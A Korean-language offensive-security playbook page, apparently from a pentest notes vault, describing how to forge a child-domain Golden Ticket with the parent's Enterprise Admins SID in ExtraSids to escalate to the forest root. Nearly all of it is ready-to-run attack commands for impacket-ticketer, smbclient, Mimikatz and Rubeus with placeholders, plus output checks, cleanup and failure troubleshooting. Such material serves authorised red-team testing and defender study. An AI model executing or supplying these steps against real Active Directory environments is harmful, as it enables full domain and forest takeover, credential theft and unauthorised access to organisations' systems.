---
tags:
  - 환경/ad
  - 서비스/kerberos
시작조건: ["자식 도메인의 krbtgt NT hash 또는 AES key 확보", "같은 포리스트의 부모 도메인 신뢰 관계 확인"]
필요권한: ["자식 도메인 krbtgt key 사용 가능", "ExtraSids가 부모 도메인 권한 평가에 사용되는 신뢰 관계"]
필요조건: ["실제 자식 도메인 사용자 이름과 RID", "자식·부모 도메인 SID와 부모 Enterprise Admins SID", "자식·부모 KDC와 부모 서비스 도달성"]
결과: ["부모 Enterprise Admins SID가 포함된 자식 도메인 Golden TGT", "부모 도메인 Kerberos 서비스 접근 검증 상태"]
---

# 자식 도메인 ExtraSids Golden Ticket

## 한 줄 판단

같은 포리스트의 자식 도메인 `krbtgt` key와 자식·부모 도메인 SID를 알고 양쪽 KDC와 부모 서비스에 도달할 수 있으면 부모 `Enterprise Admins` SID를 `ExtraSids`에 넣은 Golden TGT를 생성·주입하고 부모 리소스 권한 평가를 확인한다.

## 사용할 때

- 현재 보유 정보: 자식 도메인의 `krbtgt` NT hash 또는 AES key, 자식·부모 도메인 SID, 부모 `Enterprise Admins` SID와 실제 자식 사용자·RID를 알고 있다.
- 명령 실행 위치: Mimikatz·Rubeus를 실행하고 부모 DC SMB에 접근할 수 있는 Windows 세션, 또는 자식·부모 KDC와 부모 SMB에 접근할 수 있는 Linux 호스트다.
- 현재 가능한 행동과 결과: 부모 권한 SID가 포함된 자식 사용자 TGT를 만들고 부모 서비스 접근을 검증할 수 있다. 부모 계정 DCSync와 추출 hash 사용은 각각 [[DCSync]], [[Pass the Hash]], [[Pass the Ticket]]에서 수행한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 신뢰 관계 | 자식과 부모가 같은 포리스트에 있고 부모 방향 인증 가능 | 도메인·포리스트 정보와 trust direction 확인 | 외부·포리스트 간 trust, SID filtering과 선택적 인증 조건 확인 |
| 자식 서명 key | 자식 도메인 `krbtgt`의 현재 NT hash 또는 AES key | 자식 도메인 DCSync 결과와 key 종류 확인 | 도메인, key 종류와 `krbtgt` 세대 확인 |
| ticket에 표시할 사용자 | 실제 자식 사용자와 일치하는 RID | `impacket-lookupsid`로 사용자·RID 대응 확인 | 임의 이름이나 다른 사용자의 RID를 조합하지 않음 |
| 추가 권한 SID | `<ROOT_DOMAIN_SID>-519` | 부모 도메인 SID와 Enterprise Admins RID 519 결합 | 부모 도메인 SID, 그룹 RID와 SID filtering 확인 |
| Kerberos·서비스 경로 | 양쪽 KDC 88, 부모 SMB 445 접근과 시간 정합 | 이름 해석, 포트, `klist`와 KDC 오류 확인 | DNS·`krb5.conf`·route·시간 확인 |

### 역할 구분

| 역할 | 값 | 의미 |
|---|---|---|
| ticket 서명 주체 | 자식 도메인 `krbtgt` key | 위조한 자식 도메인 TGT의 무결성 생성 |
| ticket에 표시할 사용자 | 실제 자식 사용자와 RID | 자식·부모 KDC가 처리할 client 계정 |
| 부모 권한 | `<ROOT_DOMAIN_SID>-519` | PAC의 `ExtraSids`에 넣을 부모 Enterprise Admins SID |
| 후속 자격 증명 대상 | 부모 도메인의 지정 계정 | [[DCSync]]에서 별도로 지정할 복제 대상 |

## 실행

### Linux 공격 호스트에서 실행

#### 1. 실제 자식 사용자와 RID 확인

```bash
impacket-lookupsid '<CHILD_FQDN>/<CHILD_ADMIN>:<PASSWORD>@<CHILD_DC_FQDN>'
```

확인할 출력:

- `<CHILD_DOMAIN_SID>-<CHILD_USER_RID> <CHILD_USER>`처럼 사용자 이름과 RID가 같은 행에 표시된다.

#### 2. ExtraSids Golden TGT 생성

Linux 공격 호스트에서 기존 파일과 섞이지 않는 작업 디렉터리를 먼저 만든다. `impacket-ticketer`는 현재 디렉터리에 `<CHILD_USER>.ccache`를 생성한다.

```bash
test ! -e '<EXTRASIDS_RUN_DIRECTORY>'
mkdir -m 700 '<EXTRASIDS_RUN_DIRECTORY>'
cd '<EXTRASIDS_RUN_DIRECTORY>'
```

NT hash를 사용할 때:

```bash
impacket-ticketer -nthash <CHILD_KRBTGT_NT_HASH> -domain <CHILD_FQDN> -domain-sid <CHILD_DOMAIN_SID> -extra-sid <ROOT_DOMAIN_SID>-519 -user-id <CHILD_USER_RID> <CHILD_USER>
```

AES key를 사용할 때:

```bash
impacket-ticketer -aesKey <CHILD_KRBTGT_AES_KEY> -domain <CHILD_FQDN> -domain-sid <CHILD_DOMAIN_SID> -extra-sid <ROOT_DOMAIN_SID>-519 -user-id <CHILD_USER_RID> <CHILD_USER>
```

확인할 출력:

- `Saving ticket in <CHILD_USER>.ccache`와 실제 ccache 파일.
- 이 단계는 로컬 ticket 파일 생성만 증명하며 KDC 수락과 부모 권한은 아직 확인하지 않았다.

#### 3. 현재 shell에 ticket 지정

```bash
export KRB5CCNAME="$PWD/<CHILD_USER>.ccache"
klist -c "FILE:$KRB5CCNAME"
```

확인할 출력:

- `Default principal`이 `<CHILD_USER>@<CHILD_REALM>`과 일치하고 자식 도메인 TGT 자료가 현재 cache에 표시된다. 위조 ticket의 KDC·서비스 수락이나 현재 유효성은 이 출력만으로 확정하지 않는다.

#### 4. 부모 SMB 리소스 접근 검증

```bash
smbclient //<ROOT_DC_FQDN>/C$ --use-kerberos=required --use-krb5-ccache="$KRB5CCNAME" -N -c 'ls'
```

확인할 출력:

- 부모 DC `C$`의 디렉터리 목록.
- `-N`은 지정한 ccache를 사용하는 동안 비밀번호 입력을 생략하는 것이며 익명 인증이 아니다.

### Windows 공격 호스트에서 실행

#### 1. 자식·부모 도메인 SID 입력 확인

```powershell
Get-DomainSID
Get-DomainGroup -Domain <ROOT_FQDN> -Identity "Enterprise Admins" | Select-Object DistinguishedName,ObjectSid
```

확인할 출력:

- `Get-DomainSID`의 자식 도메인 SID와 부모 `Enterprise Admins` SID를 구분한다.
- 자식 `krbtgt` key가 필요하면 이 문서에서 다시 추출하지 않고 [[DCSync]] 결과의 대상 도메인과 key 종류를 확인한다.

#### 2. 변경 전 부모 DC 접근 기준 확인

```powershell
Get-ChildItem \\<ROOT_DC_FQDN>\c$
```

`Access is denied`가 표시되면 현재 세션에는 부모 DC 관리 공유 읽기 권한이 없음을 기준값으로 기록한다.

#### 3. Mimikatz로 생성·주입

이 방식은 현재 로그온 세션에 직접 주입하므로 기존 ticket이 없는 격리된 일회성 세션에서만 사용한다. 공유 업무 세션이라면 다음 Rubeus 분리 경로를 사용한다.

```text
mimikatz # kerberos::golden /user:<CHILD_USER> /domain:<CHILD_FQDN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<CHILD_KRBTGT_NT_HASH> /sids:<ROOT_ENTERPRISE_ADMINS_SID> /ptt
```

확인할 출력:

- `Extra SIDs`가 부모 `Enterprise Admins` SID와 일치한다.
- `successfully submitted for current session`은 ticket 주입 성공이며 부모 서비스 권한은 별도 확인한다.

#### 4. Rubeus로 분리된 세션에 생성·주입

Rubeus 2.0.3 이상에서는 ticket 파일을 만든 뒤 전용 `/netonly` process에 넣어 기존 로그온 세션과 분리한다. 출력된 PID와 LUID를 `<EXTRASIDS_PROCESS_PID>`·`<EXTRASIDS_LOGON_LUID>`로 기록한다.

```cmd
Rubeus.exe golden /rc4:<CHILD_KRBTGT_NT_HASH> /domain:<CHILD_FQDN> /sid:<CHILD_DOMAIN_SID> /sids:<ROOT_ENTERPRISE_ADMINS_SID> /user:<CHILD_USER> /outfile:<EXTRASIDS_TICKET.kirbi>
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show /ticket:<EXTRASIDS_TICKET.kirbi>
REM 새로 열린 cmd.exe에서 실행
klist
```

Rubeus 2.0.2 이하에서 현재 로그온 세션에 직접 주입하는 다음 방식은 기존 ticket과 분리해 제거하기 어렵다. 격리된 일회성 로그온 세션에서만 fallback으로 사용한다.

```cmd
Rubeus.exe golden /rc4:<CHILD_KRBTGT_NT_HASH> /domain:<CHILD_FQDN> /sid:<CHILD_DOMAIN_SID> /sids:<ROOT_ENTERPRISE_ADMINS_SID> /user:<CHILD_USER> /ptt
```

확인할 출력:

- `Domain`, `SID`, `ExtraSIDs`, `ServiceKey`가 수집한 값과 일치한다.
- `Forged a TGT`와 `Ticket successfully imported!`.

#### 5. 부모 DC 리소스 접근 확인

```powershell
klist
Get-ChildItem \\<ROOT_DC_FQDN>\c$
```

확인할 출력:

- 자식 도메인 TGT와 부모 서비스 ticket의 cache 항목. 항목 표시 자체는 발급·수락 성공이 아니며 다음 `C$` 응답과 함께 판단한다.
- 변경 전 거부됐던 부모 DC `C$` 목록이 반환되면 부모 리소스 권한 평가가 달라진 것이다.

## 변경 영향과 복구

부모 DC 접근에 사용한 client와 원격 작업을 먼저 종료한 뒤, ticket 사용 세션과 로컬 파일을 정리한다. 위조 ticket 생성·서비스 요청과 접근 감사 기록은 되돌리지 않는다.

| 생성·변경 항목 | 기존 상태와 식별값 | 종료·정리 명령 | 완료 확인 |
|---|---|---|---|
| Linux 작업 디렉터리와 Golden TGT ccache | 기존에 없던 `<EXTRASIDS_RUN_DIRECTORY>`와 그 안의 `<CHILD_USER>.ccache` | `smbclient` 종료 뒤 `kdestroy -c "FILE:$KRB5CCNAME"`, 이전 `KRB5CCNAME` 값을 사용 중이었다면 복원하고 아니면 `unset KRB5CCNAME`, 빈 디렉터리는 `rmdir '<EXTRASIDS_RUN_DIRECTORY>'` | `test ! -e '<EXTRASIDS_RUN_DIRECTORY>'`와 원래 shell 환경 확인 |
| Windows Rubeus 전용 로그온 세션 | `<EXTRASIDS_PROCESS_PID>`·`<EXTRASIDS_LOGON_LUID>` | 부모 리소스 client 종료 뒤 관리자 셸이면 `Rubeus.exe purge /luid:<EXTRASIDS_LOGON_LUID>`, 이어서 `taskkill /PID <EXTRASIDS_PROCESS_PID> /T` | 해당 PID와 전용 로그온 세션이 더 이상 존재하지 않음 |
| Windows Rubeus ticket 파일 | 실행 전 없던 `<EXTRASIDS_TICKET.kirbi>` exact 경로 | 전용 process 종료 뒤 `del <EXTRASIDS_TICKET.kirbi>` | `if exist <EXTRASIDS_TICKET.kirbi> echo REMAINS`가 출력되지 않음 |
| Mimikatz 또는 `/ptt` 현재 세션 주입 | 실행 전·후 `klist`와 로그온 세션 ID | 격리된 일회성 로그온 세션에서만 `klist purge` 후 로그오프 | 격리 세션 종료. 공유 세션이면 기존 ticket을 보존하며 위조 ticket만 제거할 수 없어 복구 제한으로 기록 |

Linux에서는 작업 전 `KRB5CCNAME` 설정 여부와 값을 Vault 밖에 기록한다. Windows의 LUID 대상 `purge`는 상승된 권한이 필요하며, 권한이 없으면 기록한 전용 process tree를 종료해 세션을 해제한다. 이름으로 모든 `cmd.exe`나 Kerberos ticket을 일괄 종료·삭제하지 않는다.

## 실패 원인 분기

| 출력·증상 | 실패한 단계 | 원인과 다음 확인 |
|---|---|---|
| `KDC_ERR_WRONG_REALM` | referral 또는 service ticket 요청 | 특정 KDC 고정 여부, 양쪽 도메인 DNS와 realm 설정 확인 |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | 자식 client principal 확인 | ticket 사용자 존재 여부와 `-user-id` RID 대응 확인 |
| `KRB_AP_ERR_SKEW` | Kerberos 인증 | 실행 호스트와 자식·부모 DC 시간 동기화 |
| 부모 `C$`가 `Access is denied` | 부모 리소스 권한 평가 | 부모 Enterprise Admins SID, trust 유형·방향, SID filtering과 현재 ticket 확인 |

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| ccache 생성과 `klist`의 자식 TGT 항목 | 로컬 Golden TGT 파일 생성과 cache 지정 성공 | ticket 자료 보유 | 부모 KDC의 service ticket 처리와 리소스 접근을 별도 확인 |
| `Ticket successfully imported!` | 현재 Windows 로그온 세션에 Golden TGT 주입 | 부모 서비스 요청 가능 | 부모 DC `C$` 접근 확인 |
| 부모 DC `C$` 목록 반환 | ExtraSids가 부모 SMB 권한으로 평가됨 | 부모 DC 파일 접근 | 자격 증명이 필요하면 [[DCSync]], ticket 사용은 [[Pass the Ticket]] |
| 부모 서비스 접근 거부 | ticket은 있으나 부모 권한 평가 실패 | 부모 권한 미확인 | trust 방향·SID filtering·선택적 인증과 서비스 ACL 확인 |

## 확인할 출력과 권한

- ticket 생성, 현재 세션 주입, 부모 KDC 수락과 부모 서비스 접근은 서로 다른 성공 단계다.
- PAC에 부모 SID가 들어간 사실만으로 모든 부모 서비스 권한을 단정하지 않는다.
- 부모 계정의 hash·key를 얻으려면 [[DCSync]], 얻은 NT hash를 사용하려면 [[Pass the Hash]]로 이동한다.

## 관련 공격기법

- [[DCSync]]
- [[Pass the Ticket]]
- [[Pass the Hash]]

## 관련 도구

- [[impacket-lookupsid]]
- [[impacket-ticketer]]
- [[PowerView]]
- [[mimikatz]]
- [[rubeus]]
- [[klist]]

## 관련 상태 라우터

- [[자식 도메인 장악 후 부모 도메인 경로 선택]]

## 참고 링크

- [Impacket ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [MIT Kerberos kdestroy](https://web.mit.edu/kerberos/krb5-latest/doc/user/user_commands/kdestroy.html)
